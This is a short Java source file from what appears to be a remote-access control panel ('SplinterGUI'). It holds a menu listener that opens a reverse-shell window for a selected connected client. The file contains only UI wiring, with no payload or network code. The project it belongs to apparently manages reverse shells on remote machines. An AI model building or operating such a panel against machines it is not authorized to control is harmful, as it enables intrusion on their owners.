package GUI.TableUtils.ReverseShell;

import Connections.Client;
import Connections.ClientHandler;
import Connections.Streams;
import GUI.Main;
import GUI.SplinterGUI;
import GUI.TableUtils.Configuration.GetSYS;
import GUI.TableUtils.Configuration.SocketType;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Objects;

public class ReverseShellMenuListener implements ActionListener {
    private final SplinterGUI mainGUI;

    public ReverseShellMenuListener(SplinterGUI gui) {
        this.mainGUI = gui;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Client client = GetSYS.getClientHandlerV2();
        assert client != null;
        new ReverseShellGUI(client);
    }
}
